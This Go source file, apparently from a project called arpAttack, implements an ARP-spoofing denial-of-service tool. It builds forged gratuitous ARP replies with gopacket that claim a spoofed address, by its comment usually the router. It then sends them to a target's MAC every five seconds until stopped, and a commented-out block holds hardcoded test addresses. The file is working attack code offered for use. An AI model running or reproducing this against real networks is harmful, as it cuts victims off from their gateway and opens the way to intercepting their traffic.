package dos

import (
	"encoding/binary"
	"errors"
	"fmt"
	"log"
	"net"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/rogercoll/arpAttack/internal/pkg/utils"
)

func ARPGratuitous(handler *pcap.Handle, iface *net.Interface, DstHwAddress, Daddr, Saddr []byte) error {
	//arp gratuitious is an arp reply without being an arp request
	//Modify the Saddr depending on the victim role
	fmt.Println("MAC: ", iface.HardwareAddr)
	eth := layers.Ethernet{
		SrcMAC:       iface.HardwareAddr,
		DstMAC:       DstHwAddress,
		EthernetType: layers.EthernetTypeARP,
	}
	arp := layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPReply,
		SourceHwAddress:   []byte(iface.HardwareAddr),
		SourceProtAddress: Saddr,
		DstHwAddress:      DstHwAddress,
		DstProtAddress:    Daddr,
	}
	fmt.Printf("%+v\n", eth)
	fmt.Printf("%+v\n", arp)
	// Set up buffer and options for serialization.
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}
	gopacket.SerializeLayers(buf, opts, &eth, &arp)
	fmt.Printf("%+v\n", eth)
	fmt.Printf("%+v\n", arp)
	if err := handler.WritePacketData(buf.Bytes()); err != nil {
		return err
	}

	return nil
}

// ips is a simple and not very good method for getting all IPv4 addresses from a
// net.IPNet.  It returns all IPs it can over the channel it sends back, closing
// the channel when done.
func ips(n *net.IPNet) (out []net.IP) {
	num := binary.BigEndian.Uint32([]byte(n.IP))
	mask := binary.BigEndian.Uint32([]byte(n.Mask))
	num &= mask
	for mask < 0xffffffff {
		var buf [4]byte
		binary.BigEndian.PutUint32(buf[:], num)
		out = append(out, net.IP(buf[:]))
		mask++
		num++
	}
	return
}

func getInterfaces() ([]net.Interface, error) {
	ifaces, err := net.Interfaces()
	if err != nil {
		return nil, err
	}
	return ifaces, nil
}

func Ole() {
	/*
			var wg sync.WaitGroup
			ifaces, err := getInterfaces()
			if err != nil {
				log.Fatal(err)
			}

			for _, iface := range ifaces {
				fmt.Printf("%+v\n", iface)
				wg.Add(1)
				go func(iface net.Interface) {
					defer wg.Done()
					if err := scan(&iface); err != nil {
						log.Printf("Interface %s error: %v", iface.Name, err)
					}
				}(iface)
			}
			wg.Wait()

		ifaces, err := getInterfaces()
		if err != nil {
			log.Fatal(err)
		}
		for _, iface := range ifaces {
			if iface.Name == "wlp58s0" {
				addr, err := getValidAddress(&iface)
				if err != nil {
					log.Fatal(err)
				}
				fmt.Printf("%+v", addr.IP)
				fmt.Println([]byte(addr.IP))
				handler, err := pcap.OpenLive(iface.Name, 65536, true, pcap.BlockForever)
				if err != nil {
					log.Fatal(err)
				}
				defer handler.Close()

				stop := make(chan struct{})
				go readARP(handler, &iface, stop)
				defer close(stop)

				dstHard, err := net.ParseMAC("b8:27:eb:bb:bd:54")
				if err != nil {
					log.Fatal(err)
				}
				dstAddr := net.IPv4(192, 168, 1, 69)
				dstAddr = dstAddr.To4()
				sAddr := net.IPv4(192, 168, 1, 1)
				sAddr = sAddr.To4()

				if err := ARPGratuitous(handler, &iface, dstHard, []byte(dstAddr), []byte(sAddr)); err != nil {
					log.Printf("error writing arp reply packets on %v: %v", iface.Name, err)
					log.Fatal(err)
				}
				//10 seconds should be more than enough to recive a response
				time.Sleep(20 * time.Second)
			}
		}
	*/
}

func performDoS(iface *net.Interface, handler *pcap.Handle, addr *net.IPNet, dstMACAddr []byte, dstAddr string, finish <-chan os.Signal) error {
	validAddr := utils.FormatAddr(dstAddr)
	fmt.Println(addr)
	for {
		select {
		case <-finish:
			return errors.New("Program finished by user")
		default:
			if err := utils.WriteARP(2, handler, iface, addr, dstMACAddr, validAddr); err != nil {
				log.Fatal(err)
			}
			fmt.Println("Sending ARP packet to the target")
			time.Sleep(time.Second * 5)
		}
	}
}

func Run(ifaceName string, dstAddr, fakeAddr string) error {
	//Normally to perform a DoS attack fakeAddr should be the router address
	//Address format => 192.168.1.1
	fmt.Println("Dos attack running")
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)

	iface, err := utils.GetInterface(ifaceName)
	if err != nil {
		return err
	}

	addr, err := utils.GetValidAddress(iface)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Printf("%+v\n", addr.IP)

	handle, err := pcap.OpenLive(iface.Name, 65536, true, pcap.BlockForever)
	if err != nil {
		return err
	}
	defer handle.Close()

	dstMACAddr, err := utils.GetDstMACAddr(iface, handle, addr, dstAddr)
	if err != nil {
		return err
	}

	fakeIP := net.IPNet{IP: utils.FormatAddr(fakeAddr), Mask: addr.Mask}
	err = performDoS(iface, handle, &fakeIP, dstMACAddr, dstAddr, c)
	if err != nil {
		return err
	}
	return nil
}
